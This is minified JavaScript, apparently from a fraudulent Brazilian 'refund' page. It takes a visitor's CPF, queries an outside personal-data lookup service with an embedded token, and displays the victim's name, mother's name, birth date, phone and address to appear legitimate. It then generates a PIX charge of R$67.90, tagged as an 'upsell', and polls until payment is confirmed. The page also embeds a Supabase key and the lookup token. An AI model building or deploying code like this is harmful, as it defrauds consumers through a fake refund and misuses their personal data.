import{i as m,r as u}from"./utm-helper-C4jEGc4L.js";import{g as p}from"./pix-preloader-tP1izpQF.js";m();const y="https://tbmhixbambsdenkxjdlz.supabase.co",f="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRibWhpeGJhbWJzZGVua3hqZGx6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQ5NzQwMjUsImV4cCI6MjA4MDU1MDAyNX0.C3xXc9utoJFguYXSEHtSEjI4p6Shnx7e3tfmK5o7dP4";let l=null,s=null,c=null;document.addEventListener("DOMContentLoaded",()=>{const e=document.getElementById("refund-button"),n=document.getElementById("back-to-main"),t=document.getElementById("refund-form"),a=document.getElementById("confirm-button"),i=document.getElementById("cpf-input");e.addEventListener("click",g),n.addEventListener("click",I),t.addEventListener("submit",v),a.addEventListener("click",$),i.addEventListener("input",r=>{let o=r.target.value.replace(/\D/g,"");o.length>11&&(o=o.slice(0,11)),o.length>9?o=o.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,"$1.$2.$3-$4"):o.length>6?o=o.replace(/(\d{3})(\d{3})(\d{1,3})/,"$1.$2.$3"):o.length>3&&(o=o.replace(/(\d{3})(\d{1,3})/,"$1.$2")),r.target.value=o})});function g(){document.getElementById("main-screen").style.display="none",document.getElementById("form-screen").style.display="block",document.getElementById("confirmation-screen").style.display="none",document.getElementById("pix-screen").style.display="none",document.getElementById("success-screen").style.display="none"}function I(){document.getElementById("main-screen").style.display="block",document.getElementById("form-screen").style.display="none",document.getElementById("confirmation-screen").style.display="none",document.getElementById("pix-screen").style.display="none",document.getElementById("success-screen").style.display="none"}function E(){document.getElementById("main-screen").style.display="none",document.getElementById("form-screen").style.display="none",document.getElementById("confirmation-screen").style.display="block",document.getElementById("pix-screen").style.display="none",document.getElementById("success-screen").style.display="none"}function h(){document.getElementById("main-screen").style.display="none",document.getElementById("form-screen").style.display="none",document.getElementById("confirmation-screen").style.display="none",document.getElementById("pix-screen").style.display="block",document.getElementById("success-screen").style.display="none"}function B(){document.getElementById("main-screen").style.display="none",document.getElementById("form-screen").style.display="none",document.getElementById("confirmation-screen").style.display="none",document.getElementById("pix-screen").style.display="none",document.getElementById("success-screen").style.display="block",setTimeout(()=>{u("confirmacao.html")},2e3)}async function v(e){e.preventDefault();const n=document.getElementById("cpf-input").value.replace(/\D/g,""),t=document.getElementById("email-input").value;if(!n||n.length!==11){alert("Por favor, insira um CPF válido.");return}if(!t||!t.includes("@")){alert("Por favor, insira um e-mail válido.");return}const a=document.getElementById("submit-form-button");a.disabled=!0,a.textContent="Consultando dados...";try{const i=await fetch(`https://bk.elaidisparos.tech/consultar-filtrada/cpf?cpf=${n}&token=5y61eukw00cavxof9866lj`);if(!i.ok)throw new Error("Erro ao consultar CPF");l={...await i.json(),email:t},b(l),E()}catch(i){console.error("Erro ao consultar CPF:",i),alert("Erro ao consultar dados. Por favor, tente novamente.")}finally{a.disabled=!1,a.textContent="Confirmar dados"}}function b(e){const n=document.getElementById("confirmation-data"),t=[{label:"Nome",value:e.nome||"Não informado"},{label:"CPF",value:x(e.cpf)||"Não informado"},{label:"E-mail",value:e.email||"Não informado"},{label:"Data de Nascimento",value:C(e.nascimento)||"Não informado"},{label:"Nome da Mãe",value:e.mae||"Não informado"},{label:"Telefone",value:e.telefone||"Não informado"},{label:"Endereço",value:P(e)||"Não informado"}];n.innerHTML=t.map(a=>`
    <div class="confirmation-row">
      <span class="confirmation-label">${a.label}</span>
      <span class="confirmation-value">${a.value}</span>
    </div>
  `).join("")}function x(e){return e?e.replace(/\D/g,"").replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,"$1.$2.$3-$4"):""}function C(e){if(!e)return"";if(e.includes("/"))return e;const n=e.replace(/\D/g,"");return n.length===8?`${n.substring(0,2)}/${n.substring(2,4)}/${n.substring(4,8)}`:e}function P(e){const n=[];return e.logradouro&&n.push(e.logradouro),e.numero&&n.push(`nº ${e.numero}`),e.bairro&&n.push(e.bairro),e.cidade&&n.push(e.cidade),e.estado&&n.push(e.estado),e.cep&&n.push(`CEP: ${e.cep}`),n.join(", ")||""}async function $(){const e=document.getElementById("confirm-button");e.disabled=!0,e.textContent="Processando...";try{h();const n=await k();D(n)}catch(n){console.error("Erro ao gerar PIX:",n),w("Erro ao gerar PIX. Por favor, tente novamente.")}finally{e.disabled=!1,e.textContent="Confirmar e enviar"}}function w(e){document.getElementById("loading").style.display="none";const n=document.getElementById("error-message");n.innerHTML=`<i class="fas fa-exclamation-circle"></i> ${e}`,n.style.display="block"}async function k(){try{const e=document.getElementById("loading-text");return e&&(e.textContent="Gerando QRCode de pagamento..."),await p("upsell4",6790)}catch(e){throw console.error("Erro ao criar PIX:",e),e}}function D(e){if(console.log("PIX gerado com sucesso:",e),s=e.transactionId,document.getElementById("loading").style.display="none",document.getElementById("payment-content").style.display="block",document.getElementById("amount").textContent=`R$ ${e.amount.toFixed(2).replace(".",",")}`,e.expirationDate){const t=new Date(e.expirationDate).toLocaleString("pt-BR",{day:"2-digit",month:"2-digit",year:"numeric",hour:"2-digit",minute:"2-digit"});document.getElementById("expiration").textContent=t}else{const t=new Date(Date.now()+18e5).toLocaleString("pt-BR",{day:"2-digit",month:"2-digit",year:"numeric",hour:"2-digit",minute:"2-digit"});document.getElementById("expiration").textContent=t}if(document.getElementById("pix-code").value=e.qrcode,e.qrcodeImageUrl){const n=document.getElementById("qrcode"),t=document.createElement("img");t.src=e.qrcodeImageUrl,t.alt="QR Code PIX",t.style.width="200px",t.style.height="200px",n.appendChild(t),console.log("QR code pré-renderizado carregado do cache")}else if(typeof QRCode<"u"&&QRCode.toCanvas){const n=document.createElement("canvas");document.getElementById("qrcode").appendChild(n),QRCode.toCanvas(n,e.qrcode,{width:200,margin:2,color:{dark:"#000000",light:"#ffffff"}},function(t){t&&(console.error("Erro ao gerar QRCode:",t),d(e.qrcode))})}else d(e.qrcode);document.getElementById("copy-btn").addEventListener("click",function(){const n=document.getElementById("pix-code");n.select(),n.setSelectionRange(0,99999),navigator.clipboard.writeText(n.value).then(()=>{const t=document.getElementById("copy-btn");t.innerHTML='<i class="fas fa-check"></i> <span>Copiado!</span>',t.classList.add("copied"),setTimeout(function(){t.innerHTML='<i class="far fa-copy"></i> <span>Copiar</span>',t.classList.remove("copied")},2e3)}).catch(t=>{console.error("Erro ao copiar:",t)})}),s&&L(s)}function d(e){const n=document.getElementById("qrcode-img");n.src=`https://quickchart.io/qr?text=${encodeURIComponent(e)}&size=200`,n.style.display="block",document.getElementById("qrcode").style.display="none"}async function S(e){try{const n=`${y}/functions/v1/check-payment`,t={Authorization:`Bearer ${f}`,"Content-Type":"application/json"},i=await(await fetch(n,{method:"POST",headers:t,body:JSON.stringify({transactionId:e}),signal:AbortSignal.timeout(1e4)})).json();return i.status==="paid"||i.status==="approved"}catch(n){return console.error("[Pagamento Upsell4] Erro ao verificar pagamento:",n),!1}}function L(e){c&&clearInterval(c),console.log(`[Pagamento Upsell4] Iniciando verificação de pagamento para transação: ${e}`);let n=0;const t=120;c=setInterval(async()=>{if(n++,n>=t){console.log(`[Pagamento Upsell4] Máximo de tentativas (${t}) atingido`),clearInterval(c);return}console.log(`[Pagamento Upsell4] Tentativa ${n}/${t}`),await S(e)&&(console.log("[Pagamento Upsell4] Pagamento confirmado! Exibindo tela de obrigado..."),clearInterval(c),B())},3e3)}window.addEventListener("beforeunload",()=>{c&&clearInterval(c)});document.addEventListener("visibilitychange",()=>{document.hidden?console.log("[Pagamento Upsell4] Página em background - polling continua"):console.log("[Pagamento Upsell4] Página voltou ao foco")});
